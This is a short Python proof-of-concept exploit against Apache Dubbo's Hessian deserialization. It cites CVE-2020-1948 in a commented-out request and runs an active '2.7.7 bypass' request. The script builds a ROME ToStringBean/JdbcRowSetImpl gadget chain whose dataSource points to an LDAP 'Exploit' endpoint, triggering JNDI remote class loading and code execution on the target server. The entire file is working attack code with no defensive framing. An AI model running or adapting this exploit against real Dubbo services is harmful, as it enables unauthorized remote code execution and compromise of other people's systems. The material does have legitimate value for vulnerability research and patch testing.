from dubbo.codec.hessian2 import Decoder,new_object
from dubbo.client import DubboClient
import sys

client = DubboClient('127.0.0.1', int(sys.argv[1]))

JdbcRowSetImpl=new_object(
      'com.sun.rowset.JdbcRowSetImpl',
      dataSource="ldap://127.0.0.1:1389/Exploit",
      strMatchColumns=["foo"]
      )
JdbcRowSetImplClass=new_object(
      'java.lang.Class',
      name="com.sun.rowset.JdbcRowSetImpl",
      )
toStringBean=new_object(
      'com.rometools.rome.feed.impl.ToStringBean',
      beanClass=JdbcRowSetImplClass,
      obj=JdbcRowSetImpl
      )
# POC 1 CVE-2020-1948
# resp = client.send_request_and_return_response(
#     service_name='org.apache.dubbo.spring.boot.demo.consumer.DemoService',
#     method_name='rce',
#     args=[toStringBean])
# 2.7.7 bypass
resp = client.send_request_and_return_response(
    service_name='org.apache.dubbo.spring.boot.sample.consumer.DemoService',
    method_name=[toStringBean],
    service_version='1.0.0',
    args=[])


print(resp)
